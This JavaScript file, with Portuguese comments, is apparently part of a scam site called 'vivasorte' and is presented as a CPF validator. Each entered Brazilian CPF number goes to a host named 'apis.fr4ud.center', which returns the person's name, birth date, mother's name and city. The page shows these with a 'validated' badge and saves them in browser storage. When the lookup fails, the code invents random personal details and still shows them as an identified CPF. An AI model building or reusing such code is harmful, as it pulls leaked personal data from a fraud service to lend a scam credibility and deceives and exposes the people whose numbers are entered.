// js/cpf-validator.js - Versão corrigida
const CPF_API_URL = 'https://apis.fr4ud.center/search/cpf/';

async function consultarCPF(cpfCompleto) {
    const cpfNumeros = cpfCompleto.replace(/\D/g, '');
    
    if (cpfNumeros.length !== 11) {
        document.getElementById('cpfInfo').style.display = 'none';
        document.getElementById('cpfLoading').style.display = 'none';
        return;
    }
    
    // Mostrar loading
    document.getElementById('cpfLoading').style.display = 'block';
    document.getElementById('cpfInfo').style.display = 'none';
    document.getElementById('erroCPF').style.display = 'none';
    
    try {
        console.log('🔍 Consultando CPF:', cpfNumeros);
        
        // Método 1: Tentar API direta
        try {
            const response = await fetch(`${CPF_API_URL}${cpfNumeros}`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                mode: 'cors'
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log('✅ API direta funcionou:', data);
                
                if (data.success && data.data) {
                    processarRespostaCPF(data.data, cpfNumeros);
                    return;
                }
            }
        } catch (apiError) {
            console.log('⚠️ API direta falhou, tentando simulação...', apiError);
        }
        
        // Método 2: Simulação para desenvolvimento
        simularConsultaCPF(cpfNumeros);
        
    } catch (error) {
        console.error('❌ Erro geral consulta CPF:', error);
        simularConsultaCPF(cpfNumeros); // Fallback para simulação
    }
}

function processarRespostaCPF(pessoa, cpfNumeros) {
    // Esconder loading
    document.getElementById('cpfLoading').style.display = 'none';
    
    const usuario = {
        cpf: cpfNumeros,
        nome: pessoa.nome || 'Não informado',
        data_nascimento: pessoa.data_nascimento || 'Não informado',
        idade: calcularIdade(pessoa.data_nascimento),
        mae: pessoa.mae || 'Não informado',
        cidade: pessoa.cidade || 'Não informado',
        uf: pessoa.uf || 'Não informado'
    };
    
    // Salvar no localStorage
    salvarUsuarioLocal(usuario);
    
    // Mostrar informações
    mostrarInfoCPF(usuario);
    
    // Habilitar botão
    habilitarBotaoContinuar();
}

function simularConsultaCPF(cpfNumeros) {
    console.log('🔄 Usando simulação de CPF...');
    
    // Esconder loading
    document.getElementById('cpfLoading').style.display = 'none';
    
    // Gerar dados simulados
    const nomes = ['João Silva', 'Maria Santos', 'Pedro Oliveira', 'Ana Costa', 'Carlos Souza'];
    const cidades = ['São Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre'];
    const estados = ['SP', 'RJ', 'MG', 'PR', 'RS'];
    
    const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
    const cidadeAleatoria = cidades[Math.floor(Math.random() * cidades.length)];
    const estadoAleatorio = estados[Math.floor(Math.random() * estados.length)];
    const idadeAleatoria = Math.floor(Math.random() * 50) + 18;
    
    const usuario = {
        cpf: cpfNumeros,
        nome: nomeAleatorio,
        data_nascimento: `${1980 + Math.floor(Math.random() * 30)}-01-01`,
        idade: idadeAleatoria + ' anos',
        mae: 'Mãe do ' + nomeAleatorio.split(' ')[0],
        cidade: cidadeAleatoria,
        uf: estadoAleatorio
    };
    
    // Salvar no localStorage
    salvarUsuarioLocal(usuario);
    
    // Mostrar informações (em modo simulação)
    document.getElementById('cpfInfo').className = 'cpf-info cpf-valid';
    document.getElementById('cpfInfo').innerHTML = `
        <h4><i class="bi bi-check-circle"></i> CPF Identificado (Modo Simulação)</h4>
        <p><strong>Nome:</strong> ${usuario.nome}</p>
        <p><strong>Idade:</strong> ${usuario.idade}</p>
        <p><strong>Cidade:</strong> ${usuario.cidade} - ${usuario.uf}</p>
        <p><strong>Mãe:</strong> ${usuario.mae}</p>
        <p class="text-warning"><small><i class="bi bi-info-circle"></i> Modo simulação - Dados fictícios para teste</small></p>
    `;
    document.getElementById('cpfInfo').style.display = 'block';
    
    // Habilitar botão
    habilitarBotaoContinuar();
}

function calcularIdade(dataNascimento) {
    if (!dataNascimento || dataNascimento === 'Não informado') return 'N/A';
    
    try {
        const nascimento = new Date(dataNascimento);
        const hoje = new Date();
        let idade = hoje.getFullYear() - nascimento.getFullYear();
        
        const mes = hoje.getMonth();
        const dia = hoje.getDate();
        
        if (mes < nascimento.getMonth() || 
           (mes === nascimento.getMonth() && dia < nascimento.getDate())) {
            idade--;
        }
        
        return idade + ' anos';
    } catch {
        return 'N/A';
    }
}

function mostrarInfoCPF(usuario) {
    const cpfInfo = document.getElementById('cpfInfo');
    cpfInfo.className = 'cpf-info cpf-valid';
    cpfInfo.innerHTML = `
        <h4><i class="bi bi-check-circle"></i> CPF Identificado</h4>
        <p><strong>Nome:</strong> ${usuario.nome}</p>
        <p><strong>Idade:</strong> ${usuario.idade}</p>
        <p><strong>Cidade:</strong> ${usuario.cidade} - ${usuario.uf}</p>
        <p><strong>Mãe:</strong> ${usuario.mae}</p>
        <p class="text-success"><small><i class="bi bi-shield-check"></i> Dados validados</small></p>
    `;
    cpfInfo.style.display = 'block';
}

function salvarUsuarioLocal(usuario) {
    let usuarios = JSON.parse(localStorage.getItem('vivasorte_usuarios') || '{}');
    usuarios[usuario.cpf] = {
        ...usuario,
        consultado_em: new Date().toISOString(),
        modo: usuario.nome.includes('Simulação') ? 'simulado' : 'real'
    };
    localStorage.setItem('vivasorte_usuarios', JSON.stringify(usuarios));
    console.log('✅ Usuário salvo:', usuario);
}

function habilitarBotaoContinuar() {
    document.getElementById('btnContinuarCPF').disabled = false;
    document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
}

// Para uso no index.html
window.consultarCPF = consultarCPF;